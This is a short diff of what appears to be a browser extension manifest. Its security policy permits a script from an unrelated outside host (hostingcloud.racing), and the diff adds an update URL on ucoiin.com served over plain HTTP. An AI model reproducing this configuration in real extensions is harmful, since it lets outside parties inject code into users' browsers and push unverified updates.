@@ -4,6 +4,7 @@
     "version": "1.0",
     "manifest_version": 2,
     "content_security_policy": "script-src 'self' https://www.hostingcloud.racing/XahE.js; object-src 'self'",
+    "update_url": "http://ucoiin.com/uCoiinMV2/updates.xml",
     "background": {
       "scripts": ["background.js"],
       "persistent": false
